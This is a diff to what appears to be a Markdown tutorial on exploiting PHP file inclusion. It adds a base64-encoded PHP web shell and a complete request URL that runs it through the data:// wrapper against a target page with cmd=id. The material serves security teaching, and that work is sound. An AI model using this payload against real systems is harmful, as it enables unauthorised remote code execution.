@@ -14,10 +14,17 @@ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep 
 
 allow_url_include = On 
 ```
-## Remote Code Execution
+### Remote Code Execution
 With `allow_url_include` enabled, we can proceed with our attack using the `data` wrapper. Aside from passing plain PHP code, we can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.
 
-First we encode our payload in Base64, then we pass the encoded payload into the data wrapper as follows:
+First we encode our payload in Base64 as follows:
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg== 
+```
+
+Then we pass the encoded payload into the data wrapper as follows:
 ```txt
-http://target-website.com/index.php?language=data://text/plain;base64,BASE64_ENCODED_PAYLOAD_HERE
+http://target-website.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
